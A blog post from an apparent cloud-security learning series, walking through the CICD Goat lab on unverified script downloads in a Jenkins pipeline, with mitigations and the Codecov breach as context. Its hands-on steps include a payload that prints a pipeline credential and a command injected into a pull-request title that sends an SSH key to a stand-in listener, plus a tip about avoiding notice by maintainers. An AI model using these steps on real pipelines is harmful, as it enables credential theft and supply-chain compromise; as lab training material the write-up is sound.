---
title: '100 Days of Cloud Security - Day 86: CICD Goat - Improper Artifact Integrity Validation'
date: '2026-02-04'
author: 'Venkata Pathuri'
excerpt: 'Day 86 of my cloud security journey - CICD Goat - Improper Artifact Integrity Validation'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 86: CICD Goat - Improper Artifact Integrity Validation

## Overview
Welcome back to our cloud security journey! On Day 86, we dive into a critical vulnerability in the Continuous Integration/Continuous Deployment (CI/CD) pipeline—**Improper Artifact Integrity Validation**. Building upon the concepts from Day 85, where we explored the implications of ungoverned usage of third-party services, today we’ll uncover how unchecked external scripts can lead to significant security risks. By the end of this session, you will understand the importance of artifact integrity and how to mitigate associated risks.

## Learning Objectives
Today, you will master the concept of artifact integrity validation and its role in securing CI/CD pipelines. You’ll learn how to identify vulnerabilities stemming from improper validation, understand the mechanics of a supply chain attack, and practice methods to guard against such exploits. In addition, you'll gain hands-on experience in manipulating a vulnerable pipeline to extract sensitive information, reinforcing your understanding of these critical concepts.

## Deep Dive
In a CI/CD environment, integrating third-party code can enhance functionality, but it also opens the door to vulnerabilities if not handled correctly. A classic example of this is the **supply chain attack**, where an attacker manipulates an external resource—such as a script or library—without the user's knowledge. 

### Understanding the Vulnerability
Imagine a CI/CD pipeline in the `Dormouse` repository that downloads and executes a script from an external source (in this case, `reportcov.sh`). The following snippet from the `Jenkinsfile` captures this action:

```groovy
stage ('Unit Tests') {
    steps {
        sh "pytest || true"
        withCredentials([usernamePassword(credentialsId: 'flag9', usernameVariable: 'USERNAME', passwordVariable: 'FLAG')]) {
            sh """curl -Os http://prod/reportcov.sh
            chmod +x reportcov.sh
            ./reportcov.sh
            """
        }
    }
}
```

Here, the pipeline fetches `reportcov.sh` and executes it without verifying its integrity. This presents a golden opportunity for an attacker. If `reportcov.sh` is compromised, it can execute malicious code within the context of the pipeline, allowing the attacker to access sensitive environment variables, like the `FLAG` credential.

### Real-World Example
Consider the infamous Codecov breach in 2021, where a misconfiguration allowed attackers to modify the Codecov script used in CI/CD pipelines. By exploiting this vulnerability, they could capture sensitive information from compromised environments, demonstrating the severe consequences of improper artifact integrity validation.

### Best Practices for Artifact Integrity
To mitigate these risks, follow these best practices:
1. **Checksum Verification**: Always verify the hash (checksum) of downloaded artifacts before execution. 
2. **Store Trusted Artifacts**: Maintain a local copy of trusted scripts in your source control to avoid dynamic downloads during builds.
3. **Use Dependency Management Tools**: Tools like Snyk or WhiteSource can help track and validate dependencies, ensuring their integrity.

## Hands-On Practice
Let’s put our knowledge into action. Here’s how to exploit the `Dormouse` pipeline and retrieve the flag:

1. **Inspecting the Vulnerable Code**: You’ll first need to access the `Dormouse` repository and review the `Jenkinsfile` as shown above.
   
2. **Running the Attack**:
   - If you have write access to `Reportcov`, modify `reportcov.sh` to include a payload:
   ```bash
   echo "THE FLAG IS: $FLAG"
   ```
   - Commit this change and trigger the `Dormouse` pipeline. Look for the output in the build logs to find the flag.

3. **If Write Access is Not Available**: 
   - Fork the `Reportcov` repository and create a pull request with a malicious command in the title to extract the SSH key:
   ```bash
   `echo "${KEY}" > key && curl -F file=@key http://YOUR_LISTENER_IP`
   ```
   - Use the stolen key to overwrite `reportcov.sh` on the production server with your malicious version.

4. **Verifying Success**: When the `Dormouse` pipeline runs, it should download your modified script and execute it, revealing the flag in the logs.

### Common Pitfalls to Avoid
- Always ensure you have the necessary permissions and access rights before attempting any modifications.
- Double-check that your payload does not inadvertently break functionality, which could alert the original maintainers.

## Key Takeaways
Today, we explored the critical importance of verifying the integrity of external artifacts in CI/CD pipelines. By understanding the risk of supply chain attacks and the methods attackers use to exploit these vulnerabilities, you are better equipped to protect your pipelines. Implementing checksum verification and maintaining trusted versions of scripts are essential practices to enhance your security posture.

## Real-World Applications
In real production environments, organizations must adopt stringent security measures to protect their CI/CD pipelines. Implementing automated checks for artifact integrity, regularly auditing third-party dependencies, and using secure coding practices are vital to safeguarding against potential attacks. By learning from incidents like the Codecov breach, teams can proactively strengthen their defenses against future vulnerabilities.

---

**Journey Progress:** 86/100 Days Complete 🚀